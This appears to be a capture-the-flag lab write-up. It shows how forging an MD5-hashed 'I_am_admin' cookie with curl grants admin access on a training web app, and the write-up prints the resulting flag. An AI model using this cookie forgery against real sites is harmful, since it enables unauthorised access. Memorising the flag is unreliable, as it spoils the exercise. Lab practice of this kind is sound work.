By looking at the data storage in the used browser we see that the website uses
a cookie with all sent requests called I_am_admin

```
Cookie: I_am_admin=68934a3e9455fa72420237eb05902327
```

It appears that the it's value is hashed with md5 according to **https://crackstation.net**.

68934a3e9455fa72420237eb05902327 - false - Possible algorithms: MD5

```
*[main][~/goinfre/projects/darkly/email]$ md5 -s "false"
MD5 ("false") = 68934a3e9455fa72420237eb05902327
*[main][~/goinfre/projects/darkly/email]$ 
```

As we see the hashed value is false means that the user browsing the website is not admin

Let's try and change the value to true and see whats goin to happen.

Using md5 command to hash the value true 

```
*[main][~/goinfre/projects/darkly/email]$ md5 -s "true" 
MD5 ("true") = b326b5062b2f0e69046810717534cb09
*[main][~/goinfre/projects/darkly/email]$ 
```

Now using this value to send a request to any route and see what's going to happen. We are goin to use curl

```
*[main][~/goinfre/projects/darkly/email]$ curl  --cookie "I_am_admin=b326b5062b2f0e69046810717534cb09"  http://10.12.177.91/             
<script>alert('Good job! Flag : df2eb4ba34ed059a1e3e89ff4dfc13445f104a1a52295214def1c4fb1693a5c3'); </script><!DOCTYPE HTML>
```
